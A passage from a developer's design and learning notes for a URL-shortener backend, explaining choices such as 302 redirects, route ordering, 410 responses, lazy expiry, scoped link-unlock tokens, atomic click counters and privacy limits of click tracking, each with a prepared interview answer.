preserve the original request method/body (307, 308) or allowed to
switch to GET (301, 302 — in practice, universally switched to GET by
real browsers regardless of what the spec technically permits).

**Why it exists in this project.** `res.redirect(302, link.destinationUrl)`
in `src/routes/redirect.ts` uses 302, not 301, and the difference is not
cosmetic. Browsers are permitted — and in practice do — cache a 301
response aggressively and indefinitely, often without ever re-checking
with the server again for that exact URL. A 302 is documented as
non-cacheable by default.

**How it works mechanically.** Every state check this route performs —
`is_active`, `expires_at`, `max_clicks` vs. `click_count`, the password
gate — runs on *every single request*, because nothing about a 302
tells the browser it may skip asking the server next time. Click
recording (`recordClick`) likewise runs on every request. If this route
returned 301 instead, the first browser to follow a given short link
would cache "`/abc1234` → `https://real-destination.com`" locally and,
for that browser, never issue another request to `/abc1234` again — not
tomorrow, not after the link is deactivated, not after its
`destinationUrl` is edited via `PATCH /api/links/:id`, not after it
expires or hits its click limit. The browser already has what it thinks
is the permanent answer and has no reason to ask again. Concretely, this
means: click counts silently stop incrementing for that visitor forever;
`is_active: false` and `expires_at` become unenforceable for anyone who
already clicked once; a password gate added *after* someone already
unlocked-and-cached a 301 response is simply bypassed on every future
click; and editing `destinationUrl` has no effect for that visitor. The
link *looks* like it's working — the visitor's browser still lands
somewhere — while every dynamic feature of the system silently stops
applying to that specific visitor, and there is no way to reverse it
server-side: a cache the server never sees again cannot be busted by
anything the server does.

**Where it lives in the codebase.** `src/routes/redirect.ts`, the
`res.redirect(302, link.destinationUrl)` call.

**Common pitfalls.**

- Using 301 for "it's simpler" or "it's marginally faster for the
  visitor" — the performance argument is real (one fewer round trip on
  repeat visits) but it trades away every piece of server-side control
  this phase just built, permanently, for whichever browsers happen to
  cache it.
- Assuming 307/308 are safer defaults because they're "newer" — they
  solve a completely different problem (preserving method/body across
  the redirect, relevant for redirecting a POST/PUT), not the caching
  question. 307 shares 302's non-cached-by-default behavior and would
  work here, but a GET-only redirect target has no method/body to
  preserve, so 302 is the simpler, purpose-fit choice — 307 adds no
  benefit for this route.

**Production considerations.** Some URL shorteners intentionally use 301
for search-engine-facing reasons (SEO tools sometimes prefer permanent
redirects) or to shave latency at massive scale by leaning on CDN/browser
caching instead of hitting origin — but that tradeoff only makes sense
once click tracking, expiry, and password gating are either not needed
or handled entirely at the edge (e.g., a CDN that can independently
invalidate its own cache). Given this project's whole premise is
per-click tracking and dynamic link state, that tradeoff doesn't apply
here.

**Interview answer.** I used 302, not 301, because the browser caching
behavior isn't a performance detail — it's irreversible. A 301 gets
cached by the browser, often indefinitely, so a visitor who's clicked a
link once may never send another request to this server for that link
again, silently freezing click counts, expiry enforcement, password
gating, and destination edits for that visitor specifically, with no
server-side way to invalidate a cache it can't see. 302 (or 307, which
differs only in method/body preservation, irrelevant for a GET-only
redirect) tells the browser explicitly not to cache, so every click
actually reaches the server and gets evaluated against current link
state.

---

### Route ordering and wildcard shadowing, tied to reserved words

**What it is.** Continued from Phase 6's "Reserved words and route
shadowing" section — this is where that anticipated problem actually
gets solved, now that `redirectRouter` exists.

**Why it exists in this project.** `redirectRouter`'s `GET /:shortCode`
is a single-segment wildcard: Express (via path-to-regexp) matches
`:shortCode` against exactly one path segment, never spanning a `/`. That
means it can only ever collide with other *single-segment* routes —
`/health` today, a bare `/api` if ever requested with nothing after it —
and never with multi-segment routes like `/api/auth/login` or
`/api/links/:id`, which always win on their own more specific prefix
match regardless of where `redirectRouter` is mounted.

**How it works mechanically.** Two independent layers protect against
this, and they protect against different failure modes:

1. **Write-time (Phase 6):** `RESERVED_SHORT_CODES` in
   `src/lib/shortCode.ts` stops anyone from ever *creating* a link whose
   short code is `health`, `api`, `auth`, etc. — `customAliasSchema`'s
   `.refine()` rejects it with 400 before the row can exist.
2. **Runtime (this phase):** `src/app.ts` mounts `app.use(redirectRouter)`
   *after* `rootRouter`, `healthRouter`, `/api/auth`, and `/api/links` —
   and before the catch-all 404. Express matches middleware/routes in
   registration order and stops at the first match, so `/health` is
   handled by the real `healthRouter` before `redirectRouter` ever sees
   the request, regardless of what row (if any) exists at `short_code =
   'health'`.

The second layer matters even though the first, in isolation, already
guarantees no such row can exist — because the two layers guard against
different failures. Layer 1 is a guarantee about *data*: no row can ever
impersonate a real path. Layer 2 is a guarantee about *request handling*:
even if that data guarantee were ever violated (a bug in the `.refine()`,
a direct DB write bypassing the API, a future reserved word added after
existing links were created), correct mount order still means the
`/health` *request* reaches the real health check first — `redirectRouter`
would simply never be consulted for that literal path. Relying on either
layer alone leaves a gap; both together close it from two independent
directions.

**Where it lives in the codebase.** `src/app.ts` (mount order and the
comment explaining it); `src/lib/shortCode.ts` (`RESERVED_SHORT_CODES`,
carried over from Phase 6).

**Common pitfalls.**

- Mounting `redirectRouter` early "since it's simple" or alongside
  `rootRouter` — the *content* of the route doesn't change based on
  mount position, but *which requests it ever gets a chance to handle*
  does. A route mounted first always wins ties against a route mounted
  later, for any request shape both could match.
- Believing the reserved-word list alone is sufficient and skipping the
  mount-order reasoning — as explained above, the two guarantees cover
  different failure modes; dropping either one narrows, but doesn't
  eliminate, the shadowing risk.

**Production considerations.** At a much larger route surface, manually
keeping `RESERVED_SHORT_CODES` and "mount the wildcard route last" in
sync by hand becomes more error-prone — Phase 6 already noted deriving
the reserved list programmatically from the router's own registered
top-level paths as the scalable alternative; the same observation applies
here; mount order itself, however, has no equivalent shortcut — a
wildcard route being last is a structural property of the app, not
something that can be derived from data.

**Interview answer.** `/:shortCode` only matches a single path segment,
so it can only ever collide with other single-segment routes like
`/health` — never with `/api/auth/*` or `/api/links/*`, which always win
on their own more specific prefix regardless of mount order. Two
independent layers guard the single-segment case: `RESERVED_SHORT_CODES`
stops a link from ever being *created* at a real path like `health`
(a write-time guarantee), and mounting the redirect router last in
`src/app.ts` means the real `/health` handler always gets first refusal
on that literal request (a runtime guarantee). I keep both because they
protect against different failures — one about what data can exist, the
other about which handler a given request actually reaches — and either
one alone leaves a gap the other closes.

---

### 404 vs. 410 for deliberately-ended resources

**What it is.** RFC 9110 §15.5.9 defines 410 Gone as "the target resource
is no longer available... this condition is considered to be permanent,"
distinct from 404's "the origin server did not find a current
representation... or is not willing to disclose that one exists."

**Why it exists in this project.** `src/routes/redirect.ts`'s
`deadStateError` returns 410 for three cases: `is_active: false`,
`expires_at` in the past, and `click_count >= max_clicks`. All three
describe a link the server *knows about* and is *declining to serve on
purpose* — a materially different claim than "no idea what this could
ever refer to," which is what a genuinely nonexistent short code (still
404) means.

**How it works mechanically.** `deadStateError` in `src/routes/redirect.ts`
checks all three conditions, in order, against the row `getLinkByShortCode`
returns, and is shared between `GET /:shortCode` and `POST
/:shortCode/unlock` so both agree on what "dead" means without
duplicating the logic. `gone()` in `src/lib/errors.ts` is a new factory
alongside the existing `notFound`/`conflict`/etc., producing `{ statusCode:
410, code: 'GONE' }` through the same centralized error-formatting
middleware every other error already uses.

**Where it lives in the codebase.** `src/lib/errors.ts` (`gone()`,
the `'GONE'` `ErrorCode`); `src/routes/redirect.ts` (`deadStateError`).

**Common pitfalls.**

- Treating "technically reversible via `PATCH`" as disqualifying 410 —
  it doesn't. RFC 9110 doesn't require true permanence, only that the
  server isn't obligated to imply the resource might return; an owner
  flipping `isActive` back to `true`, raising `maxClicks`, or extending
  `expiresAt` doesn't retroactively make 404 the more accurate status
  for the moment the request was actually rejected.
- Splitting `is_active: false` into its own 404 case while treating
  expiry/click-limit as 410 — all three are the same class of outcome
  ("this used to resolve, doesn't right now, on purpose"), and treating
  them identically at the status-code level is more useful to API
  consumers than an inconsistency with no real semantic basis.

**Production considerations.** Some link-shortener APIs distinguish
further — e.g., a distinct code or `details` payload for "deactivated by
owner" vs. "expired" vs. "click limit reached" — useful if a frontend
wants to show a different message per cause. This project's `gone()`
calls already pass a cause-specific `message` (`details` in the AppError
shape), so that distinction exists in the response body without needing
three different HTTP status codes for it.

**Interview answer.** 404 means the server has no idea what a URI could
ever refer to; 410 means the server knows exactly what it was and is
declining to serve it on purpose — which is the case for a deactivated,
expired, or click-exhausted link, since `getLinkByShortCode` found a real
row and evaluated real state to reject it. I treat all three "dead"
states identically as 410, including `is_active: false`, even though all
three are technically reversible via a later `PATCH` — RFC 9110 doesn't
require true permanence for 410, and splitting one of the three cases
into 404 for no reason beyond that reversibility would be an
inconsistency with no real semantic basis.

---

### Lazy vs. scheduled expiry

**What it is.** Lazy expiry checks whether something has expired only
when it's actually read/used, doing nothing until then. Scheduled expiry
runs a separate process on a timer that proactively finds and handles
expired rows regardless of whether anyone reads them.

**Why it exists in this project.** `deadStateError` in
`src/routes/redirect.ts` is lazy-only, by design, for this phase: it
compares `expires_at`/`click_count` against the current time/limit *at
request time* and returns 410 if they've passed, but never `UPDATE`s or
`DELETE`s the row to reflect that. An expired link's row looks identical
in the database the instant after it expires and a year later — nothing
proactively marks it.

**How it works mechanically.** Every dead-state check in this phase is a
pure read: `deadStateError` computes a boolean from data already fetched
by `getLinkByShortCode` and either throws or doesn't — no write happens
as a side effect of discovering expiry. This is a deliberate scope
boundary for Phase 7 (per the task brief driving this phase): "lazy
expiry only... Phase 10 adds the sweep."

**Where it lives in the codebase.** `src/routes/redirect.ts`
(`deadStateError`'s read-only checks).

**Common pitfalls.**

- Assuming lazy expiry alone is sufficient in production — it only
  closes the gap for rows someone actually requests. An expired link
  nobody ever clicks again sits in the table forever, invisibly, taking
  up storage and (once Phase 12's indexing pass adds `expires_at`/
  `is_active` indexes) still costing index maintenance on every write to
  a table that's silently accumulating dead weight.
- Assuming a scheduled sweep alone is sufficient — between sweep runs,
  a link can be technically expired but still lazily unaware of it until
  the next sweep tick if nothing else checks in between. Lazy expiry is
  what closes *that* gap: correctness the instant a request arrives,
  not just eventually on the sweep's schedule.

**Production considerations.** This is exactly why production systems
that expire things at scale (session stores, cache entries, this table
eventually) tend to run both mechanisms together: lazy expiry gives
immediate, per-request correctness with zero extra infrastructure;
scheduled expiry (a sweep job, Phase 10 here) reclaims storage and index
space from rows nobody's requesting, and stops every future read from
repeatedly re-evaluating a row that's provably, permanently dead. Running
only one leaves either a correctness gap (scheduled-only, between sweeps)
or a storage/cost gap (lazy-only, forever) that the other closes.

**Interview answer.** This phase only implements lazy expiry: `is_active`,
`expires_at`, and `click_count` vs. `max_clicks` are checked at read
time, and an expired row is never written to or deleted as a result —
that's Phase 10's sweep job. Lazy expiry alone gives immediate,
per-request correctness for free, but leaves expired rows accumulating
in the table forever since nothing proactively cleans them up; a
scheduled sweep alone would leave a correctness gap between runs. That's
why production systems that expire things at real scale usually run
both — lazy for instant correctness, scheduled to reclaim storage and
stop repeatedly re-evaluating rows that are already known to be dead.

---

### Per-link passwords as a distinct auth problem from user sessions

**What it is.** `tokenService.ts`'s JWTs (`TokenPayload { sub, iat, exp }`)
authenticate a *user* of Click Scope — someone with a row in `users`,
logging in to manage their own links. A password on an individual link
authenticates a *visitor's knowledge of that one link's password* — an
entirely different subject, with no user row behind it at all.

**Why it exists in this project.** A visitor unlocking a
password-protected link is, by definition, someone reachable through
`redirectRouter` — the unauthenticated, public route. They may not have
a Click Scope account at all. Reusing `tokenService.signToken(userId)`
here would require inventing a fake `userId` to put in `sub`, or
stretching `sub`'s meaning to sometimes mean "a link id instead of a
user id" — either one is a category error: `sub` in every other part of
this codebase means exactly one thing (a row in `users`), and quietly
overloading it here would make every future piece of code that reads a
token's `sub` unable to assume that anymore.

**How it works mechanically.** `src/services/unlockTokenService.ts` is a
separate, small module — `signUnlockToken(linkId)` /
`verifyUnlockToken(token)` — with its own payload shape (`{ linkId, typ:
'link_unlock' }`, no `sub`) and its own lifetime (`UNLOCK_TOKEN_TTL =
'30m'`, vs. `tokenService`'s 7-day default). It reuses
`config.JWT_SECRET` rather than adding a second secret (see "Scoped,
short-lived grants" below for why that's still safe), but the `typ`
discriminator keeps the two token *shapes* non-interchangeable — a real
user session token has no `linkId`/`typ` claim, so `verifyUnlockToken`
rejects it even though `jwt.verify()` would happily validate its
signature.

**Where it lives in the codebase.** `src/services/unlockTokenService.ts`
(new, separate from `src/services/tokenService.ts`).

**Common pitfalls.**

- Reaching for `requireAuth`/`tokenService` "since it's already there" —
  it would silently require every link-unlocker to have a Click Scope
  account, which breaks the entire feature for anonymous visitors, who
  are the overwhelming majority of people who'll ever see this
  interstitial.
- Putting `linkId` in a real session token's payload instead of building
  a separate token type — even if it "worked" mechanically, it would mean
  `tokenService.verifyToken`'s callers (i.e., `requireAuth`) now need to
  know about a claim that only makes sense for a completely different,
  unrelated flow.

**Production considerations.** If link-unlock grants ever needed to be
independently revocable without touching real user sessions (e.g., "log
this visitor out of every link they've unlocked" as a feature), a
denylist or a per-link version counter checked at `verifyUnlockToken`
time would be the next step — not built here, since nothing in this
phase needs unlock grants to be revocable before their 30-minute expiry
anyway.

**Interview answer.** I built a separate token service for link unlocks
rather than reusing the user-session JWTs from Phase 4, because the
subject is fundamentally different — a visitor proving they know one
link's password isn't a user of Click Scope and may have no account at
all, so there's no `users` row to put in a session token's `sub` claim.
The unlock token has its own payload shape (`linkId`, not `sub`), its
own short lifetime (30 minutes vs. 7 days), and a `typ` discriminator
that keeps it structurally rejected by anything expecting a real session
token, even though both happen to share a signing secret.

---

### Scoped, short-lived grants

**What it is.** A "scoped" grant proves authorization for one specific
resource, not a category of resources — the opposite of a session token
that, once valid, is valid for everything a user account can do.

**Why it exists in this project.** Unlocking link A must never grant
access to link B, even though both are protected by the same mechanism
and, in this project, the same JWT secret. That's the CRITICAL
requirement this phase names explicitly, and it's what
`unlockTokenService.signUnlockToken(linkId)` and the caller-side check in
`src/routes/redirect.ts` are built specifically to guarantee.

**How it works mechanically.** Two layers, doing two different jobs:

1. **Cookie naming** — `link_unlock_<shortCode>`, plus `path:
   /${shortCode}` on the cookie itself — means a browser won't even
   *attach* link A's cookie to a request for link B under normal
   operation. This is a convenience/defense-in-depth layer, not the
   actual security boundary: it's just a naming convention a client could
   ignore or a request could be crafted to bypass.
2. **Payload comparison** — `verified.linkId !== link.id` in
   `redirectRouter`'s `GET /:shortCode` handler — is the real
   enforcement. Even if a cookie named `link_unlock_<shortCodeB>` somehow
   arrived carrying link A's signed token (exactly what
   `tests/routes/redirect.test.ts`'s "CRITICAL" test forges and sends),
   `verifyUnlockToken` still returns link A's real id, and the equality
   check against link B's actual id fails — the interstitial is served
   again, not a redirect.

The grant names the specific link *inside the signed payload*, not just
in an external convention like a cookie name, precisely so that the
enforcement doesn't depend on any client behaving cooperatively.

**Where it lives in the codebase.**
`src/services/unlockTokenService.ts` (`signUnlockToken`,
`verifyUnlockToken`); `src/routes/redirect.ts` (`cookieNameFor`, the
`verified.linkId !== link.id` check); the "CRITICAL" test in
`tests/routes/redirect.test.ts`.

**Common pitfalls.**

- Relying on cookie-name scoping alone and skipping the payload
  comparison — this is exactly the bug the CRITICAL test is designed to
  catch: a forged or misdirected cookie with the *right name* but the
  *wrong linkId inside it* would silently succeed without the equality
  check.
- A grant that names "a link was unlocked" (a boolean) instead of *which*
  link — the CRITICAL requirement is unenforceable without the specific
  id being part of what's verified, since there'd be nothing to compare
  against.

**Production considerations.** The 30-minute expiry is a judgment call,
not a load-bearing security boundary the way a user session's expiry is
— it exists so a stale grant doesn't linger indefinitely in a visitor's
browser, not to defend against a sophisticated attacker (bcrypt already
handles the actual password-guessing resistance, rate limiting on
`/unlock` is the still-open gap noted below).

**Interview answer.** The unlock grant is scoped by embedding the link's
real database id inside the signed JWT payload and comparing it against
the actually-requested link's id on every subsequent request — that
comparison in `src/routes/redirect.ts` is the real enforcement. The
per-link cookie name is a second, independent layer that stops a browser
from even sending the wrong cookie under normal use, but it's not what
actually prevents the attack; I wrote a test that forges a
correctly-named cookie carrying a *different* link's signed token
specifically to prove the payload check, not the naming convention, is
what closes the gap.

---

### Denormalized counters

**What it is.** A denormalized counter is a value stored redundantly
alongside data it could otherwise be computed from on demand — trading
storage and write-time complexity for cheap, O(1) reads instead of
recomputing an aggregate every time it's needed.

**Why it exists in this project.** `links.click_count` could, in
principle, always be derived as `SELECT COUNT(*) FROM clicks WHERE
link_id = $1` — `clicks` already has every row needed to compute it.
Maintaining `click_count` as its own column exists so that every
`deadStateError` check (`click_count >= max_clicks`) and every list/get
response doesn't have to run a `COUNT(*)` over a table that will, at real
scale, be far larger than `links` itself — one row per link vs. one row
per click, potentially thousands of clicks per popular link.

**How it works mechanically.** `clickService.recordClick` writes both:
one `INSERT` into `clicks` (the detailed, append-only record — one row
per click, with `referrer`/`user_agent`) and one `UPDATE links SET
click_count = click_count + 1` (the maintained aggregate). `clicks`
remains the source of truth; `click_count` is a cache of one aggregate
over it, kept in sync by every write path that adds a click.

**Where it lives in the codebase.**
`migrations/20260810111606896_create-links-table.ts` (`click_count`
column, with its non-negative check constraint);
`migrations/20260810111607018_create-clicks-table.ts` (`clicks`, the
source of truth); `src/services/clickService.ts` (`recordClick`, the one
function that writes both).

**Common pitfalls.**

- Forgetting that a denormalized value needs *every* write path that
  affects the underlying data to also update it — `recordClick` is
  currently the only place clicks are recorded, so this isn't an issue
  yet, but a future feature that inserts into `clicks` through any other
  path (a bulk import, an admin tool) would need to remember to also
  update `click_count`, or the two would silently drift.
- Treating the denormalized counter as more authoritative than the table
  it's derived from — `clicks` is the source of truth; `click_count`
  is a read-path optimization over it, not the other way around. This
  ordering matters directly for the transaction decision below.

**Production considerations.** At the scale where `COUNT(*)` on `clicks`
becomes genuinely too slow for a hot read path, denormalization is the
standard answer — the alternative, a materialized view or a periodic
recomputation job, trades staleness for not having to keep a counter
manually in sync on every write; not needed here since `recordClick`
already keeps both in sync inline on every click.

**Interview answer.** `click_count` exists purely as a read-path
optimization — `clicks` already has everything needed to compute it via
`COUNT(*)`, but that gets expensive at scale since `clicks` will have far
more rows than `links`. `clicks` stays the source of truth; `click_count`
is a maintained cache over it, updated by the one write path
(`recordClick`) that adds a click. That ordering — cache vs. source of
truth — is exactly what let me reason clearly about how much consistency
between the two actually matters when deciding whether to wrap their
writes in a transaction.

---

### Atomic increments vs. read-then-write, and the lost-update race

**What it is.** A "lost update" is a race condition where two concurrent
operations each read the same starting value, then each independently
write back their own "value + 1" — and because both reads happened
before either write, one of the two increments is silently overwritten
and never reflected in the final value.

**Why it exists in this project.** Every click to a popular link is, by
definition, a concurrent write to the same row's `click_count`. A naive
implementation — `SELECT click_count FROM links WHERE id = $1` in
application code, add 1 in JavaScript, then `UPDATE links SET click_count
= $2` — is exactly the shape of the race: two requests arriving close
together can both read `click_count = 5` before either writes back `6`,
and the final stored value is `6`, not `7`, even though two clicks
happened.

**How it works mechanically.** `clickService.recordClick` never reads
`click_count` into application memory at all — `UPDATE links SET
click_count = click_count + 1 WHERE id = $1` computes the increment
entirely inside Postgres, as part of a single statement. Postgres
executes that statement atomically per row: a second concurrent `UPDATE`
targeting the same row either waits for the first to complete (under
MVCC's row-level locking) or operates on the post-first-update value —
there is no window where two concurrent increments can both read the
same pre-increment value, because neither one ever reads it into
anywhere a race could occur. This holds regardless of whether the
statement runs inside an explicit multi-statement transaction or on its
own — the atomicity is a property of the single `UPDATE`, not of any
wrapping around it.

**Where it lives in the codebase.** `src/services/clickService.ts`
(`recordClick`'s `UPDATE ... SET click_count = click_count + 1`); the
concurrency test in `tests/routes/redirect.test.ts` ("concurrent
redirects to the same link do not lose clicks"), which fires 20 parallel
requests and asserts the final count is exactly 20 — a test that would
fail under a naive read-then-write implementation but passes here.

**Common pitfalls.**

- Reading a counter into application code "just to log it" or "to decide
  whether to also check max_clicks" and then writing back
  `count + 1` from that same read — even if the read is only used for a
  side purpose, writing back a value derived from it reintroduces the
  exact race, regardless of intent.
- Assuming an explicit transaction is what prevents the lost-update race
  here — it isn't; the single computed `UPDATE` is what prevents it,
  independent of transactional wrapping. This distinction is what the
  next section's benchmark decision turns on.

**Production considerations.** This pattern — `column = column + 1`
computed server-side — generalizes to any counter under concurrent
writes (rate-limit counters, inventory counts, view counters); the
general fix is always "let the database compute the delta," never "read,
modify, write" from application code, regardless of the specific ORM or
query builder in use.

**Interview answer.** The lost-update race happens when two concurrent
requests both read the same counter value before either writes back an
incremented one, so one increment is silently lost — exactly what would
happen with `SELECT click_count`, add 1 in JavaScript, `UPDATE`. I avoid
it entirely by never reading the counter into application code: `UPDATE
links SET click_count = click_count + 1` computes the increment inside a
single Postgres statement, which executes atomically per row under
MVCC. I proved this concretely with a test that fires 20 concurrent
redirects at the same link and asserts the final count is exactly 20 —
it would fail under a naive read-then-write and passes here.

---

### Synchronous side effects on a latency-critical path

**What it is.** A "synchronous side effect" here means the redirect
response doesn't get sent to the visitor until the click-recording writes
have actually completed — the opposite of firing them off and responding
immediately without waiting.

**Why it exists in this project — deliberately, for now.** This phase
keeps click recording synchronous on purpose, specifically so its real
cost can be measured before Phase 10 moves it onto a queue (BullMQ,
already a project dependency for the worker process). Optimizing before
measuring would mean never actually knowing whether the queue made a
meaningful difference.

**How it works mechanically, and what the measurement showed.**
`src/routes/redirect.ts`'s `GET /:shortCode` handler times the
`recordClick` call specifically (`process.hrtime.bigint()` before/after,
logged via `req.log.info({ durationMs }, 'Click recorded')`) — separate
from `requestContext.ts`'s whole-request timing, because isolating the
DB-write cost specifically is what Phase 10's comparison actually needs,
not overall request latency (which also includes routing, cookie
parsing, and the link lookup).

Before settling on `clickService.recordClick`'s final shape, two versions
were benchmarked head-to-head against the same local Postgres instance,
300 iterations each after a warm-up: the two writes (`INSERT` into
`clicks`, `UPDATE` on `click_count`) issued as plain, independent calls
through `query()`, versus the same two writes wrapped in an explicit
`BEGIN`/`COMMIT` transaction on one dedicated connection. Median latency:
**~0.5ms non-transactional vs. ~0.75ms transactional** — the
transactional version cost roughly 1.5x as long, consistent with paying
for two extra network round trips (`BEGIN`, `COMMIT`) on top of the same
two statements.

That overhead bought exactly one thing: `clicks` and `click_count` never
disagreeing even if the process crashes in the gap between the `INSERT`
resolving and the `UPDATE` being issued. It did **not** buy the
"no lost updates under concurrency" guarantee — as the previous section
covers, that's already fully guaranteed by the single computed `UPDATE`
statement, with or without a wrapping transaction; the concurrency test
passes either way. And per "Denormalized counters" above, `clicks` is
already the source of truth, `click_count` a read-path cache over it —
the `INSERT` always runs first, so the only possible drift from skipping
the transaction is `click_count` under-counting by however many clicks
were physically mid-flight at the exact instant of a crash (over-counting
isn't possible, since an `UPDATE` never fires without its `INSERT`
already having committed). That's a narrow, self-limiting, low-severity
risk — a rare crash causing a rare, small, one-directional undercount of
a display counter with no reconciliation job to matter to even in Phase
10 — traded against a consistent ~50% latency tax on the single hottest
path in the entire system, which locally is sub-millisecond but would
scale with real network round-trip time to a production database, not
shrink.

Given that, `recordClick` ships as the plain two-write version — no
transaction. The `withTransaction` helper built to run the benchmark was
removed from `src/db/pool.ts` afterward rather than left in as unused
infrastructure, since nothing in this codebase currently calls it; the
exact pattern (a dedicated `pool.connect()` client, `BEGIN`/try/`COMMIT`/
catch-`ROLLBACK`/finally-`release`) is what to reach for if a future
phase adds a write that genuinely needs multi-statement atomicity —
e.g., anything where `click_count` (or an equivalent) becomes a hard
security or billing boundary rather than a display counter, which would
flip this cost/benefit calculation.

**Where it lives in the codebase.** `src/services/clickService.ts`
(`recordClick`, with the reasoning inline); `src/routes/redirect.ts`
(the `durationMs` timing/logging around the `recordClick` call).

**Common pitfalls.**

- Reaching for a transaction by default whenever two related writes
  happen together, without asking what specific guarantee it adds beyond
  what a single atomic statement (or the actual consistency
  requirements) already provides — "two writes that are related" is not
  automatically "two writes that need ACID atomicity together."
- Benchmarking on localhost and assuming the *relative* cost transfers
  unchanged to production — the ratio (roughly 2x round trips for the
  transactional version: `BEGIN`+`INSERT`+`UPDATE`+`COMMIT` vs.
  `INSERT`+`UPDATE`) is what should transfer; the *absolute* added
  latency should be expected to grow, not shrink, once real network RTT
  to a production database (e.g., via Supabase's Supavisor pooler) replaces
  near-zero local loopback latency.

**Production considerations.** This decision is explicitly revisitable:
if `click_count` (or a similar counter) is ever used for something where
a rare, small undercount is unacceptable — billing, a hard usage cap
enforced as a security boundary rather than a courtesy limit — the
transactional version is a known, already-benchmarked option to fall
back to, at a known, already-measured cost.

**Interview answer.** I kept click recording synchronous this phase
specifically to measure its real cost before Phase 10 moves it to a
queue — a representative synchronous redirect, including the click
write, ran in the single-digit milliseconds locally, with the write
itself the dominant cost. I also benchmarked wrapping the two writes
(insert + counter update) in an explicit transaction versus not, and
found the transactional version cost about 1.5x as long — roughly two
extra network round trips for `BEGIN`/`COMMIT`. I chose not to keep the
transaction: the "no lost updates" guarantee people usually reach for a
transaction to get is already fully provided by the single atomic
`UPDATE click_count = click_count + 1` regardless of transactional
wrapping, so the only thing the transaction actually bought was
protection against a rare crash landing in a sub-millisecond gap between
two statements, causing at most a small, one-directional undercount of a
denormalized display counter that already isn't the source of truth.
That felt like the wrong trade on the hottest path in the whole system,
especially on the exact metric this phase exists to establish a baseline
for.

---

### Why not `cookie-parser`

**What it is.** `cookie-parser` is a widely-used Express middleware that
parses the `Cookie` request header into `req.cookies` (and, with a
secret, `req.signedCookies`), and can help construct `Set-Cookie` values.

**Why it wasn't added.** Two things this phase needs from cookies —
setting one, and reading one specific, known-named one back — need
either nothing or a few lines, respectively. `res.cookie(...)` is built
into Express itself; no middleware is required to *set* a cookie, only
to parse incoming ones. And the unlock grant is already a signed JWT
(`unlockTokenService.ts`) — tamper-evidence is already handled there, so
`cookie-parser`'s own signed-cookie feature would be a second, redundant
signing mechanism layered on top of the first.

**How it works mechanically.** `src/lib/cookies.ts`'s `readCookie(header,
name)` splits the raw `Cookie` header on `;`, finds the segment whose
name matches, and returns its decoded value — a handful of lines that
cover exactly the one thing this phase needs (look up one named cookie),
without pulling in `cookie-parser`'s broader feature set: parsing *every*
cookie into `req.cookies` regardless of whether anything reads it, JSON
cookie support, and its own independent signing scheme.

**Where it lives in the codebase.** `src/lib/cookies.ts` (`readCookie`);
`src/routes/redirect.ts` (`res.cookie(...)` to set, `readCookie` to
read back).

**Common pitfalls.**

- Adding a well-known middleware reflexively because "that's what you use
  for cookies in Express" without checking what this specific use case
  actually needs — CLAUDE.md's "never add a dependency silently, name it,
  justify it, note the alternative" applies just as much to a *decision
  not to add one*, which is why this section exists.
- Hand-rolling cookie *signing* as well as parsing — not needed here,
  since the unlock token is already a signed JWT; a hand-rolled signing
  scheme on top would be actively worse than either using
  `cookie-parser`'s signing or (as done here) not needing cookie-level
  signing at all.

**Production considerations.** If a future phase needs to read many
different, dynamically-named cookies, or JSON-valued cookies, or several
independently-signed ones, `cookie-parser` (or an equivalent) becomes the
right call at that point — this isn't "cookie-parser is bad," it's "this
phase's actual requirement doesn't need it yet."

**Interview answer.** I didn't add `cookie-parser` because the two things
this phase needs from cookies don't require it: setting one is built
into Express (`res.cookie`, no middleware needed), and reading back one
specific, known cookie name is a short loop over the raw header. The
unlock token is already a signed JWT, so `cookie-parser`'s signed-cookie
feature would just be a second, redundant signing layer on top of the
first. I'd reach for it if a future feature needed to parse many
different or dynamically-named cookies, but that's not what this phase
does.

---

### Privacy considerations of click tracking

**What it is.** Every click records `referrer` and `user_agent` alongside
the link it belongs to — data that, even without a user account attached
to it, can be used to fingerprint or profile a visitor across clicks.

**Why it exists in this project.** `referrer` and `user_agent` are the
two pieces of context Phase 7's spec calls for capturing per click, and
they're genuinely useful for the analytics this project is building
toward — knowing where clicks come from and what device/browser clicked
is standard link-analytics functionality. But capturing them isn't
free of privacy considerations just because no login is involved.

**How it works mechanically.** `clickService.recordClick` reads
`req.header('referer')` (the HTTP header's actual, historically-misspelled
name — this project's own column is spelled correctly, `referrer`) and
`req.header('user-agent')`, both nullable — a request through most
browsers' privacy modes, or with `Referrer-Policy` restricting outbound
referrers, may send neither, and both are stored as `NULL` rather than
erroring. Notably, **no IP address is captured or stored anywhere in this
schema** — `clicks` has a `country` column (nullable, presumably meant to
be resolved from a request's IP by some future geolocation step) but no
`ip_address` column at all, so a raw IP is never persisted even
transiently by the code in this phase.

**Where it lives in the codebase.**
`migrations/20260810111607018_create-clicks-table.ts` (`referrer`,
`user_agent`, `country` columns — no IP column);
`src/services/clickService.ts` (what's actually read from the request and
stored).

**Common pitfalls.**

- Treating "no user account" as equivalent to "no privacy
  consideration" — `user_agent` combined with `referrer` and click
  timing can still meaningfully fingerprint a device/browser across
  multiple clicks on links from the same short-code owner, even with zero
  identifying account data attached.
- Assuming `country` being nullable-and-unpopulated in this phase means
  no location signal exists at all — the column's presence signals an
  intent to resolve it from IP later; whatever mechanism eventually
  populates it will need its own privacy reasoning about IP handling at
  that point, not just at storage time.

**Production considerations, deliberately not built in this phase:**

- **Retention limits.** Nothing in this schema or this phase deletes old
  `clicks` rows — a production system handling real traffic would need
  an explicit retention/TTL policy, not indefinite accumulation.
- **Consent.** No consent banner or opt-out mechanism exists for EU (or
  other jurisdiction) visitors; a production deployment serving such
  visitors would need one before recording `referrer`/`user_agent` at
  all, under GDPR and similar regimes.
- **IP handling.** If a future phase adds IP-based geolocation to
  populate `country`, that raises its own questions (store the raw IP?
  for how long? hash/truncate it?) that this phase deliberately doesn't
  need to answer, since no IP is captured at all right now.
- **Anonymization.** No hashing, truncation, or aggregation of
  `user_agent`/`referrer` happens before storage — they're kept exactly
  as the request sent them.
- **Rate limiting on `/unlock`.** Not privacy-specific, but the same
  "deliberately deferred" category: nothing currently limits how many
  password guesses `POST /:shortCode/unlock` will accept — that's
  explicitly Phase 11's job, not this phase's. bcrypt's own cost factor
  slows each individual guess, but that's not a substitute for rate
  limiting against a sustained automated attempt.

**Interview answer.** Click recording stores `referrer` and `user_agent`
per click, both nullable to handle privacy-mode browsers or restrictive
referrer policies gracefully rather than erroring — but deliberately no
IP address at all; the schema's `country` column exists for a future
geolocation step, not for storing a raw IP now. Even without an account
attached, that combination can still fingerprint a device across clicks,
